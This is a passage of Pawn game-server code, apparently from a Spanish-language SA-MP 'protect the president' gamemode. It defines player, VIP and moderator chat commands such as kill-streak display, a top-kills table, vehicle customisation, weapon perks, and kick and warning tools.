	GetPlayerName(id_president, name, sizeof(name));
	GetPlayer2DZone(id_president, zone, MAX_ZONE_NAME);
	format(str, sizeof(str), "* Presidente actual: %s (ID: %d)", name, id_president);
	SendClientMessage(playerid, 0x97FF2FFF, str);
	switch(GetPlayerState(id_president)) //Estado del presidente, si esta a pie, conduciendo o como pasajero.
	{
		case PLAYER_STATE_ONFOOT:format(str, sizeof(str), "* El Presidente actualmente se encuentra a pie cerca de %s.", zone);
		case PLAYER_STATE_DRIVER:format(str, sizeof(str), "* El Presidente actualmente se encuentra conduciendo un %s cerca de %s.", NamesVehicles[GetVehicleModel(GetPlayerVehicleID(id_president)) - 400], zone);
		case PLAYER_STATE_PASSENGER:format(str, sizeof(str), "* El Presidente actualmente se encuentra como pasajero en un %s cerca de %s.", NamesVehicles[GetVehicleModel(GetPlayerVehicleID(id_president)) - 400], zone);
	}
	SendClientMessage(playerid, 0x97FF2FFF, str);
	format(str, sizeof(str), "* El tiempo restante antes de que el Presidente %s esté a salvo: %d %s.", name, Minutes, ((Minutes == 1) ? ("minuto") : ("minutos")));
	SendClientMessage(playerid, 0x97FF2FFF, str);
	return 1;
}

cmd:timeleft(playerid)
{
	if(id_president == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, Rojo, "ERROR: No se puede mirar el tiempo restante porque no hay un Presidente.");
	new str[80 + 24];
	new name[24];
	GetPlayerName(id_president, name, sizeof(name));
	format(str, sizeof(str), "* Tiempo restante antes de que el Presidente %s (ID: %d) esté a salvo: %d %s.", name, id_president, Minutes, ((Minutes == 1) ? ("minuto") : ("minutos")));
	SendClientMessage(playerid, 0x97FF2FFF, str);
	return 1;
}

cmd:tl(playerid)
{
	new string[103];
	format(string, sizeof(string),
	"Opción:\tRespuesta:\n\
	Mostrar tiempo restante en TextDraw\t%s\n\
	Mostrar tiempo restante cada 1 minuto\t%s",
	((TimeLeft[playerid][TEXT_DRAW] == true) ? ("Si") : ("No")),
	((TimeLeft[playerid][GAME_TEXT] == true) ? ("Si") : ("No")));
	ShowPlayerDialog(playerid, DIALOG_TL, DIALOG_STYLE_TABLIST_HEADERS, "Configuración", string, "Seleccionar", "Cerrar");
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:ej(playerid)
{
    new vehicleid = GetPlayerVehicleID(playerid);
	if(!(vehicleid != 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes estar dentro de un vehículo.");
	if(!(GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes ser el conductor para usar este comando.");
	if(!(GetVehicleModel(vehicleid) == 520 || GetVehicleModel(vehicleid) == 476))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes estar en un hydra o rustler.");
	new Float:X;
	new Float:Y;
	new Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	SetPlayerPos(playerid, X, Y, Z+100);
	SetVehicleHealth(vehicleid, 0);
	GivePlayerWeapon(playerid, 46, 1);
	return 1;
}

cmd:sync(playerid)
{
	if(IsPlayerInAnyVehicle(playerid) == 1)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no puede usar este comando estando en un vehículo.");
	if(Data[playerid][Sync] > gettime())
		return SendClientMessage(playerid, Rojo, "ERROR: Debes esperar 30 segundos para volver a usar este comando.");
	new Float:X;
	new Float:Y;
	new Float:Z;
	new Float:W;
	Data[playerid][Sync] = gettime() + 30;
	GetPlayerPos(playerid, X, Y, Z);
	GetPlayerFacingAngle(playerid, W);
	SetPlayerPos(playerid, X, Y, Z);
	SetPlayerFacingAngle(playerid, W);
	SetCameraBehindPlayer(playerid);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:racha(playerid, params[])
{
	new userid;
	new spree[44 + 24];
	if(sscanf(params, "d", userid))
	{
		SendClientMessage(playerid, Rojo, "* También puedes usar /racha [playerid]");
		format(spree, sizeof(spree), "* Usted tiene %d %s sin morir.", Data[playerid][KillingSpree], ((Data[playerid][KillingSpree] == 1) ? ("asesinato") : ("asesinatos")));
		SendClientMessage(playerid, 0x97FF2FFF, spree);
		return 1;
	}
	if(IsPlayerConnected(userid) == 0)
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no esta conectado.");
	new name[24];
	GetPlayerName(userid, name, sizeof(name));
	format(spree, sizeof(spree), "* %s (ID: %d): Lleva %d %s sin morir.", name, userid, Data[userid][KillingSpree], ((Data[userid][KillingSpree] == 1) ? ("asesinato") : ("asesinatos")));
	SendClientMessage(playerid, 0x97FF2FFF, spree);
	return 1;
}

cmd:holiday(playerid)
{
	if(HolidayOn == false)
	    return SendClientMessage(playerid, Rojo, "ERROR: Este comando fue desactivado por un administrador.");
	if(Data[playerid][Teams] == PRESIDENT)
	    return SendClientMessage(playerid, Rojo, "ERROR: El Presidente no puede usar este comando.");
	if(Data[playerid][Teams] == VICEPRESIDENT)
	    return SendClientMessage(playerid, Rojo, "ERROR: El VicePresidente no puede usar este comando.");
   	if(Data[playerid][ASK] == true)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted para usar este comando necesita primero salir de su área de spawn.");
	if(Data[playerid][TimeHoli] > gettime())
	    return SetPlayerTimeCMD(playerid, "para volver a usar este comando", Data[playerid][TimeHoli], 3);
	Data[playerid][TimeHoli] = gettime() + (60 * 3);
	Weapons(playerid, WEAPON_SPRAYCAN, 500, WEAPON_RIFLE, 125, WEAPON_GRENADE, 3);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:topkills(playerid)
{
    new datos[40];
	new len[31 + (40 * 5)];
	new TopUsers[5];
	new var = 0;
	new i = 0;
	new lugarid = 0;
	new bool:Tiene_un_lugar = false;
	for(i = 0; i < sizeof(TopUsers); ++i)
	    TopUsers[i] = INVALID_PLAYER_ID;
	    
	for(lugarid = 0; lugarid < sizeof(TopUsers); ++lugarid)
	{ //Con este ciclo principal encontraremos el id del jugador con mayor asesinato para que ocupe su lugar correspondiente
	    var = 0;
	    foreach(new jugadorid : Player)//Con este ciclo anidado 1 se recorre cada id válida de un jugador
	    {
	        for(i = 0; i < sizeof(TopUsers); ++i)//Con este ciclo anidado 2 se verifica si el jugador está en alguna posición de la tabla
			{
			    if(TopUsers[i] == jugadorid)
			    {
			        Tiene_un_lugar = true;//Tiene un lugar en la tabla
			        break;
			    }
			}
			if(Tiene_un_lugar == true)//Si el jugador está en algún lugar de la tabla (1 posición, 2 posición, etc)
			{
			    Tiene_un_lugar = false;//Tiene un lugar en la tabla
			    continue;
			}
			if(GetPlayerKills(jugadorid) > var)
			{
			    var = GetPlayerKills(jugadorid);
			    TopUsers[lugarid] = jugadorid;
			}
	    }
	}
	Tiene_un_lugar = false;
	strcat(len, "Lugar\tNombre\tID\tAsesinatos\n");
	new name[24];
	for(i = 0; i < sizeof(TopUsers); i++)//Va a mostrar todas las id válidas guardadas en el array "TopUsers"
	{
	    if(TopUsers[i] == INVALID_PLAYER_ID) continue;
	    for(var = 0; var < sizeof(TopUsers); ++var)
	    {//Ciclo anidado para detectar si los asesinatos de los jugadores que están en la tabla no son equivalentes
	        if((TopUsers[var] != INVALID_PLAYER_ID) && (i != var) && (GetPlayerKills(TopUsers[i]) == GetPlayerKills(TopUsers[var])))
	        {
				Tiene_un_lugar = true;//Tiene un lugar en la tabla, pero sus asesinatos es igual a otro jugador
				break;
	        }
	        else continue;
	    }
	    if(Tiene_un_lugar == false)//Tiene un lugar en la tabla, pero sus asesinatos no es igual a otro jugador
	    {
	        GetPlayerName(TopUsers[i], name, sizeof(name));
    		format(datos, sizeof(datos), "#%d\t%s\t%d\t%d\n", (i + 1), name, TopUsers[i], GetPlayerKills(TopUsers[i]));
	    	strcat(len, datos);
	    }
	    Tiene_un_lugar = false;
	}
	//printf("DEBUG: %d,%d,%d,%d,%d\n", TopUsers[0], TopUsers[1], TopUsers[2], TopUsers[3], TopUsers[4]);
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_TABLIST_HEADERS, "Top 5 - Mayores Asesinatos", len, "Cerrar", "");
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:rc(playerid)
{
	if(Data[playerid][Teams] == PRESIDENT)
	    return SendClientMessage(playerid, Rojo, "ERROR: El Presidente no puede cambiarse de equipo.");
	if(Data[playerid][Teams] == VICEPRESIDENT)
	    return SendClientMessage(playerid, Rojo, "ERROR: El VicePresidente no puede cambiarse de equipo.");
	if(!(IsPlayerInAnyVehicle(playerid) == 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no puede estar en un vehículo para usar este comando.");
	SetPlayerSelectTeam(playerid);
	return 1;
}

cmd:deber(playerid, params[])
{
	if(params[0] != '\0' && strcmp(params, "Policia", true) == 0)
	    params[5] = 'í';
	if(params[0] == '\0')
 	{
 	    SetPlayerDuty(playerid, Data[playerid][Teams]);
	 	SendClientMessage(playerid, Rojo, "* También puedes usar /deber [nombre de la clase]");
	 	SendClientMessage(playerid, Rojo, "* Ejemplo: /deber seguridad");
	 	return 1;
 	}
 	new aux = Data[playerid][Teams];
	for(new i = 0; i < 7; ++i)
	{
	    Data[playerid][Teams] = i+1;
 		if(strcmp(params, GetTeamName(playerid), true) == 0)
		{
		    SetPlayerDuty(playerid, Data[playerid][Teams]);
		    Data[playerid][Teams] = aux;
 			break;
		}
		if(i == 7-1)
		{
			SendClientMessage(playerid, Rojo, "USO: /deber [nombre de la clase]");
			SendClientMessage(playerid, Rojo, "* Ejemplo: /deber presidente");
			Data[playerid][Teams] = aux;
		}
	}
	return 1;
}

/* Comandos nivel 2 (VIP) */

cmd:vcmds(playerid)
{
	new cmds_vip[2255];
 	strcat(cmds_vip, "Lista de comandos para los jugadores que sean VIP (Very Important Person)\n\n");
 	strcat(cmds_vip, "* /vcmds - Muestra una lista de comandos VIP\n");
	strcat(cmds_vip, "* /vskin - Te permite cambiar tu skin mediante una id. Ejemplo: /skin 53\n");
	strcat(cmds_vip, "* /mskin - Te muestra un menú para seleccionar tu skin mediante modelos\n");
	strcat(cmds_vip, "* /guardarskin - Guarda tu skin actual para que lo puedas usar después cuando vuelvas a entrar al servidor\n");
	strcat(cmds_vip, "* /quitarskin - Restablece la skin guardada, o sea, te la elimina para que puedas guardar otro\n");
	strcat(cmds_vip, "* /ruedas - Le permite elegir entre múltiples tipos de ruedas para su vehículo\n");
	strcat(cmds_vip, "* /nitro o /nos o presionando Y - Le da a su vehículo nitro\n");
	strcat(cmds_vip, "* /vipme - Te da una motosierra y un francotirador\n");
	strcat(cmds_vip, "* /armas -  Te muestra un menú donde puedes elegir un armamento como el: Rifle, Sniper, 9mm, motosierra o la katana\n");
	strcat(cmds_vip, "* /saw - Te da una motosierra\n");
	strcat(cmds_vip, "* /sniper - Te da un franco tirador con 125 de munición\n");
	strcat(cmds_vip, "* /rifle - Te da un rifle con 125 munición\n");
	strcat(cmds_vip, "* /kata - Te da una katana\n");
	strcat(cmds_vip, "* /colt45 - Te da una pistola 9mm con 500 de munición\n");
	strcat(cmds_vip, "* /decir -  Muestra un mensaje en amarillo. Ejemplo: /decir MrDave es un novato;\n");
	strcat(cmds_vip, "  Usted verá en el chat: [VIP] * Quido: MrDave es un novato\n");
	strcat(cmds_vip, "* /cc - Hace que su vehículo destelle en varios colores\n");
	strcat(cmds_vip, "* /ccolor -  Le permite cambiar el color de su vehículo\n");
	strcat(cmds_vip, "* /pinturas -  Le muestra un diálogo donde puede seleccionar de manera cómoda un color primario y secundario para su vehículo\n");
	strcat(cmds_vip, "* /vset - Lo hace para que spawnees con las armas VIP más populares, la motosierra y el francotirador\n");
	strcat(cmds_vip, "* /guardarcolor - Guarda un color específico del vehículo, para que cada vez que ingrese a un vehículo tenga ese color\n");
	strcat(cmds_vip, "* /quitarcolor - Restablece el color del vehículo guardado\n");
	strcat(cmds_vip, "* /guardarnos - Tu vehículo tiene nitro cada vez que ingresas al vehículo\n");
	strcat(cmds_vip, "* /hidraulicos o /h - Tu vehículo tiene sistema hidráulico cada vez que ingresas al vehículo\n");
	strcat(cmds_vip, "* /guardarrueda - Tu vehículo tiene tu juego preferido de ruedas cada vez que ingresas\n");
	strcat(cmds_vip, "* /quitarrueda - Restablece la elección de tu rueda\n");
	strcat(cmds_vip, "* /autotune - Alterna las modificaciones de su vehículo (nitro, color, sistema hidráulico y ruedas)\n");
 	strcat(cmds_vip, "Con $[texto] hablas por el chat VIP. Ejemplo: $Hola\n");
 	strcat(cmds_vip, "- Beneficio:\n");
	strcat(cmds_vip, "* Puedes entrar a cualquier clase sin importar que esté disponible o no, con /rc o /clase");
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "Comandos Nivel 2 (VIP)", cmds_vip, "Cerrar", "");
	return 1;
}

cmd:vskin(playerid, params[])
{
	if(sscanf(params, "d", params[0]))
		return SendClientMessage(playerid, Rojo, "USO: /vskin [skin id]");
	if(!(params[0] >= 0 && params[0] <= 311))
		return SendClientMessage(playerid, Rojo, "ERROR: Ingresa un skin válido.");
	new skin[10];
	SetPlayerSkin(playerid, params[0]);
	format(skin, sizeof(skin), "SKIN: %d", params[0]);
	GameTextForPlayer(playerid, skin, 3000, 4);
	PlayerPlaySound(playerid,1083,0.0,0.0,0.0);
	return 1;
}

cmd:mskin(playerid)
	return ShowModelSelectionMenu(playerid, skins_vip, "Skins");

cmd:guardarskin(playerid, params[])
{
	if(!(Data[playerid][SkinGuarded] == -1))
		return SendClientMessage(playerid, Rojo, "ERROR: Usted ya tiene guardado un skin, usa /quitarskin para eliminarlo.");
	new str[24];
	format(str, sizeof(str), "SKIN GUARDADO - ID: %d", GetPlayerSkin(playerid));
	GameTextForPlayer(playerid, str, 3000, 3);
	Data[playerid][SkinGuarded] = GetPlayerSkin(playerid);
	WriteData(playerid, SKIN);
	PlayerPlaySound(playerid,1083,0.0,0.0,0.0);
	return 1;
}

cmd:quitarskin(playerid)
{
	if(!(Data[playerid][SkinGuarded] != -1))
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no tiene guardado ningún skin, usa /guardarskin para almacenar uno en su cuenta.");
	new str[25];
	format(str, sizeof(str), "SKIN ID: %d - ELIMINADO", Data[playerid][SkinGuarded]);
	GameTextForPlayer(playerid, str, 3000, 3);
	Data[playerid][SkinGuarded] = -1;
	WriteData(playerid, SKIN);
	SetPlayerSkin(playerid, Data[playerid][SkinClass]);
	PlayerPlaySound(playerid,1083,0.0,0.0,0.0);
	return 1;
}

cmd:ruedas(playerid)
{
    ShowModelSelectionMenu(playerid, ruedas_vip, "Ruedas");
	return 1;
}

cmd:nitro(playerid)
{
	AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
	GameTextForPlayer(playerid,"NITRO AGREGADO", 3000, 3);
	PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	return 1;
}

cmd:vipme(playerid)
{
	Weapons(playerid, WEAPON_CHAINSAW, 1, WEAPON_SNIPER, 125);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:armas(playerid)
	return ShowModelSelectionMenu(playerid, armas_vip, "Armas");

cmd:saw(playerid)
{
	Weapons(playerid, WEAPON_CHAINSAW, 1);
	GameTextForPlayer(playerid, "MOTOSIERRA", 3000, 3);
	return 1;
}

cmd:sniper(playerid)
{
	Weapons(playerid, WEAPON_SNIPER, 125);
	GameTextForPlayer(playerid, "Franco Tirador", 3000, 3);
	return 1;
}

cmd:rifle(playerid)
{
	Weapons(playerid, WEAPON_RIFLE, 125);
	GameTextForPlayer(playerid, "RIFLE", 3000, 3);
	return 1;
}

cmd:kata(playerid)
{
	Weapons(playerid, WEAPON_KATANA, 1);
	GameTextForPlayer(playerid, "KATANA", 3000, 3);
	return 1;
}

cmd:colt45(playerid)
{
	Weapons(playerid, WEAPON_COLT45, 500);
	GameTextForPlayer(playerid, "Pistola 9mm", 3000, 3);
	return 1;
}

cmd:pinturas(playerid)
{
	ShowPlayerDialog(playerid, DIALOG_COLORS_PRIMARY, DIALOG_STYLE_LIST, "Colores Primarios", "Negro\nBlanco\nCeleste\nRojo\nGris\nRosado\nAmarillo\nAzul", "Seleccionar", "Cerrar");
	return 1;
}

cmd:cc(playerid)
{
	VIP[playerid][cc] = !VIP[playerid][cc];
	if(VIP[playerid][cc] == true)
		VIP[playerid][Stop_cc] = repeat Colors_Vehicle(playerid);
	new str[58];
	format(str, sizeof(str), "* Para %s la pintura automática usa /cc de nuevo.", ((!VIP[playerid][cc]) ? ("activar") : ("desactivar")));
	SendClientMessage(playerid, Amarillo, str);
	PlayerPlaySound(playerid, ((VIP[playerid][cc] == false) ? (1139) : (1134)), 0, 0, 0);
	if(VIP[playerid][cc] == false)
	{
		stop VIP[playerid][Stop_cc];
		SetVehicleColorEx(playerid, GetPlayerVehicleID(playerid));
	}
	return 1;
}

cmd:ccolor(playerid, params[])
{
	static colorid1;
	static colorid2;
	static i = -1;
	static bool:xvalue = false;
	if(strlen(params) > 7)
		return SendClientMessage(playerid, Rojo, "ERROR: Sólo se puede ingresar tres dígitos.");
	if(!(params[0] == '\0'))
	{
		do
		{
	   	 	++i;
	   	 	if(params[i] == '\0') break;
	    	if((params[i] >= 'A' && params[i] <= 'Z') || (params[i] >= 'a' && params[i] <= 'z'))
	    	{
				xvalue = true;
	        	break;
	    	}
		}while(i > -1);
		i = -1; // valor por defecto que tendrá de nuevo i
	}
	if(xvalue == true)
	{
		SendClientMessage(playerid, Rojo, "ERROR: Sólo se puede ingresar números.");
		xvalue = false;
		return 1;
	}
	if(!(params[0] != '\0'))
		return SendClientMessage(playerid, Rojo, "USO: /ccolor [colorid1] ([colorid2])");
	if(!sscanf(params, "dd", colorid1, colorid2))
	{
		if(!((colorid1 >= 0 && colorid1 <= 255) && (colorid2 >= 0 && colorid2 <= 255)))
			return SendClientMessage(playerid, Rojo, "ERROR: El color debe ser un valor entre 0 y 255.");
		ChangeVehicleColorEx(GetPlayerVehicleID(playerid), colorid1, colorid2);
		PlayerPlaySound(playerid, 1134, 0.0, 0.0, 0.0);
		return 1;
	}
	if(!(colorid1 >= 0 && colorid1 <= 255))
		return SendClientMessage(playerid, Rojo, "ERROR: El color debe ser un valor entre 0 y 255.");
	ChangeVehicleColorEx(GetPlayerVehicleID(playerid), colorid1, colorid1);
	PlayerPlaySound(playerid, 1134, 0.0, 0.0, 0.0);
	return 1;
}

cmd:vset(playerid)
{
	VIP[playerid][Vset] = true;
	pc_cmd_vipme(playerid);
	SendClientMessage(playerid, Amarillo, "{FF9900}* Ahora cada vez que te maten o te hagan algún respawn, tendrás tus armas favoritas.");
	return 1;
}

cmd:guardarcolor(playerid)
{
	if(VIP[playerid][cc])
	    return SendClientMessage(playerid, Rojo, "ERROR: Usted debe usar de nuevo /cc para poder emplear este comando.");
	if(VIP[playerid][ColorPrimary] != -1)
	    return SendClientMessage(playerid, Rojo, "ERROR: Debes eliminar el color actual que habías guardado. Usa /quitarcolor o /resetcolor.");
	new color1 = 0;
	new color2 = 0;
	GetVehicleColor(GetPlayerVehicleID(playerid), color1, color2);
	VIP[playerid][ColorPrimary] = color1;
	VIP[playerid][ColorSecundary] = color2;
	SendClientMessage(playerid, Amarillo, "* El color (primario y secundario) del vehículo fue guardado con éxito.");
	PlayerPlaySound(playerid, 1139, 0.0, 0.0, 0.0);
	return 1;
}

cmd:quitarcolor(playerid)
{
	if(VIP[playerid][ColorPrimary] == -1)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no ha guardado ningún color de su vehículo. Usa /guardarcolor o /savecolor.");
	VIP[playerid][ColorPrimary] = -1;
	VIP[playerid][ColorSecundary] = -1;
	SendClientMessage(playerid, Amarillo, "* El color que tenías guardado anteriormente, fue eliminado con éxito.");
	PlayerPlaySound(playerid, 1139, 0.0, 0.0, 0.0);
	return 1;
}

cmd:guardarnos(playerid)
{
	if(VIP[playerid][Nitro])
	    return SendClientMessage(playerid, Rojo, "ERROR: Usted ya guardó su nitro.");
	new vehicleid = GetPlayerVehicleID(playerid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && vehicleid != 0)
	{
		AddVehicleComponent(vehicleid, 1010);
		PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	}
	VIP[playerid][Nitro] = true;
	SendClientMessage(playerid, Amarillo, "* Ahora cada vez que entres a un vehículo, el nitro se pondrá de manera automática.");
	return 1;
}

cmd:hidraulicos(playerid)
{
	if(VIP[playerid][Hydraulics])
	    return SendClientMessage(playerid, Rojo, "ERROR: Usted ya guardó su hidraúlico.");
	new vehicleid = GetPlayerVehicleID(playerid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && vehicleid != 0)
	{
		AddVehicleComponent(vehicleid, 1087);
		PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	}
	VIP[playerid][Hydraulics] = true;
	SendClientMessage(playerid, Amarillo, "* Ahora cada vez que entres a un vehículo, tendrás hidraúlicos de manera automática.");
	return 1;
}

cmd:guardarrueda(playerid)
{
	if(VIP[playerid][Wheels])
	    return SendClientMessage(playerid, Rojo, "ERROR: Usted ya guardó una llanta, use /quitarrueda o /resetwheels");
	if(VIP[playerid][SaveWheels_ID] == -1)
	    return SendClientMessage(playerid, Rojo, "ERROR: Utiliza /ruedas para seleccionar una y luego usa /guardarrueda");
	VIP[playerid][Wheels] = true;
	new NameWheels[9];
	new string[59];
	GetNameWheels(VIP[playerid][SaveWheels_ID], NameWheels);
	format(string, sizeof(string), "* Ruedas guardadas con éxito (Nombre de la rueda: %s).", NameWheels);
	SendClientMessage(playerid, Amarillo, string);
	return 1;
}

cmd:quitarrueda(playerid)
{
	if(!VIP[playerid][Wheels])
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no ha guardado ninguna rueda, use /guardarrueda o /savewheels");
	VIP[playerid][Wheels] = false;
	new NameWheels[9];
	new string[75];
	GetNameWheels(VIP[playerid][SaveWheels_ID], NameWheels);
	format(string, sizeof(string), "* Haz eliminado las ruedas que tenías antes (Nombre de la rueda: %s).", NameWheels);
	SendClientMessage(playerid, Amarillo, string);
	VIP[playerid][SaveWheels_ID] = -1;
	return 1;
}

cmd:autotune(playerid)
{
	ShowPlayerDialog(playerid, DIALOG_AUTOTUNE, DIALOG_STYLE_LIST, "Auto Ajustes", "Nitro\nColores\nHidraúlicos\nRuedas", "Seleccionar", "Cerrar");
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:decir(playerid, params[])
{
	if(params[0] == '\0')
	{
		SendClientMessage(playerid, Rojo, "USO: /decir [mensaje]");
		SendClientMessage(playerid, Rojo, "* También puedes hablar con &[texto]");
		return 1;
	}
	if(AntiSpam(playerid, params)) return 1;
	new string[128];
	new name[24];
	new lvl = Data[playerid][Level];
	GetPlayerName(playerid, name, sizeof(name));
	format(string, sizeof(string), "[%s]* %s: %s", GetRankName(playerid), name, params);
	SendClientMessageToAll(((lvl == 2) ? (0xFFFF80FF) : ((lvl == 3) ? (0x97FF2FFF) : ((lvl == 4) ? (0xFF66FFAA) : (0xC0C0C0FF)))), string);
	return 1;
}

/* Comandos nivel 3 (Moderador) */
cmd:mcmds(playerid)
{
	new cmds_mod[1225];
	strcat(cmds_mod, "Lista de comandos para los jugadores que sean moderadores:\n\n");
	strcat(cmds_mod, "* /mcmds - Muestra una lista de comandos para jugadores que sean nivel 3\n");
	strcat(cmds_mod, "* /anuncio - Envía un texto grande a todos los jugadores (estilo: 3)\n");
	strcat(cmds_mod, "* /darequipo - Cambias a un determinado jugador de una clase\n");
	strcat(cmds_mod, "* /ir - Te desplaza a la posición de un determinado jugador\n");
	strcat(cmds_mod, "* /traer - Traes a un especifico jugador a tu ubicación\n");
	strcat(cmds_mod, "* /advertir - Proporciona una advertencia a un usuario\n");
	strcat(cmds_mod, "* /decir - Muestra un mensaje en verde. Ejemplo: /decir MrDave es un novato;\n");
	strcat(cmds_mod, "  Usted verá en el chat: [Moderador] * Quido: MrDave es un novato\n\n");
	strcat(cmds_mod, "* /cancion - Pone una música para todos los jugadores\n");
	strcat(cmds_mod, "* /loquendo - Envía un mensaje a todos los jugadores con la voz de loquendo\n");
	strcat(cmds_mod, "* /expulsar - Bota a un jugador del servidor\n");
	strcat(cmds_mod, "* /espiar - Establece tu cámara en modo de espectador para espiar a un jugador\n");
	strcat(cmds_mod, "* /noespiar - Elimina el modo de espectador\n");
	strcat(cmds_mod, "* /jetpack - Proporciona un chaleco que te permitirá volar\n");
	strcat(cmds_mod, "* /slap - Da una bofetada a un determinado jugador\n");
	strcat(cmds_mod, "* /respawncar o /rscar - Da un respawn a todos los vehículos de una Ciudad\n");
	strcat(cmds_mod, "* /fiestaon - Desactiva/Activa el comando /fiesta\n");
	strcat(cmds_mod, "* /ip - Mostrará la IP (protocolo internet) de un jugador\n\n");
	strcat(cmds_mod, "Con #[texto] hablas por el chat admin. Ejemplo: #Hola");
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "Comandos Nivel 3 (Moderador)", cmds_mod, "Cerrar", "");
	return 1;
}

cmd:holidayon(playerid)
{
	HolidayOn = !HolidayOn;
	new str[66 + 24];
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(str, sizeof(str), "* %s %s el comando /holiday o /fiesta para todos los jugadores", name, ((HolidayOn == true) ? ("activó") : ("desactivó")));
	SendClientMessageToAll(Amarillo, str);
	if(HolidayOn == true)
		SendClientMessageToAll(Amarillo, "* Use /holiday o /fiesta para poder obtener un rifle + 3 granadas + un spray");
	new INI:File = INI_Open("cmds.txt");
	INI_WriteBool(File, "CMD_Holiday", HolidayOn);
	INI_Close(File);
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:anuncio(playerid, params[])
{
	if(params[0] == '\0')
		return SendClientMessage(playerid, Rojo, "USO: /anuncio [texto]");
	GameTextForAll(params, 4000, 3);
	return 1;
}

cmd:slap(playerid, params[])
{
	if(sscanf(params,"d", params[0]))
		return SendClientMessage(playerid,Rojo,"USO: /slap [playerid]");
	if(!(IsPlayerConnected(params[0]) == 1))
		return SendClientMessage(playerid,Rojo,"ERROR: Ese jugador no se encuentra conectado.");
	if(params[0] == playerid)
 		return SendClientMessage(playerid,Rojo,"ERROR: El ID ingresado eres tù.");
  	if(IsPlayerInClassSelection(params[0]) != 0)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador se encuentra en la selección de clases.");
	new Float:X;
	new Float:Y;
	new Float:Z;
	GetPlayerPos(params[0],X,Y,Z);
	SetPlayerPos(params[0],X,Y,Z+10);
	return 1;
}

cmd:jetpack(playerid)
{
	if(!(IsPlayerInAnyVehicle(playerid) == 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes bajarte del vehículo para usar un jetpack.");
	SetPlayerSpecialAction(playerid, 2);
	GameTextForPlayer(playerid, "JETPACK", 5000, 4);
	PlayerPlaySound(playerid,1083,0.0,0.0,0.0);
	return 1;
}

cmd:expulsar(playerid, params[])
{
	if(sscanf(params, "ds", params[0], params[1]))
		return SendClientMessage(playerid, Rojo, "USO: /expulsar [playerid] [reason]");
	if(IsPlayerConnected(params[0]) != 1)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no está conectado.");
	if(params[0] == playerid)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no se puede autoexpulsar.");
	if(Data[params[0]][Level] == 3)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes expulsar a un moderador.");
	if(Data[params[0]][Level] == 4)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes expulsar a un administrador.");
	if(Data[params[0]][Level] == 5)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes expulsar a un dueño.");
    Kicked = true;
	new string[31+(3*24)];
	new name1[24];
	new name2[24];
	GetPlayerName(playerid, name1, sizeof(name1));
	GetPlayerName(params[0], name2, sizeof(name2));
	format(string, sizeof(string), "%s expulsó a %s del servidor [Razón: %s]", name1, name2, params[1]);
	SendClientMessageToAll(Rojo, string);
	SendMessage(params[0], params[1]);
	return 1;
}

cmd:advertir(playerid, params[])
{
	if(sscanf(params, "ds", params[0], params[1]))
		return SendClientMessage(playerid, Rojo, "USO: /advertir [playerid] [reason]");
 	if(IsPlayerConnected(params[0]) != 1)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no está conectado.");
 	if(params[0] == playerid)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted mismo no se puede dar una advertencia.");
	if(Data[params[0]][Level] == 3)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes darle una advertencia a un moderador.");
	if(Data[params[0]][Level] == 4)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes darle una advertencia a un administrador.");
	if(Data[params[0]][Level] == 5)
	    return SendClientMessage(playerid, Rojo, "ERROR: No puedes darle una advertencia a un dueño.");
	new string[128];
	new name1[24];
	new name2[24];
	GetPlayerName(playerid, name1, sizeof(name1));
	GetPlayerName(params[0], name2, sizeof(name2));
	format(string, sizeof(string), "** %s(%d) le dio una advertencia a %s(%d) [%d/3] [Razón: %s]", name1, playerid, name2, params[0], ++Data[params[0]][Warning], params[1]);
	SendClientMessageToAll(Amarillo, string);
	if(Data[params[0]][Warning] >= 3)
	{
		Kicked = true;
		SetPlayerMessage(params[0], params[1], Rojo);
	}
	return 1;
}

cmd:darequipo(playerid, params[])
{
	if(sscanf(params, "dd", params[0], params[1]))
	{
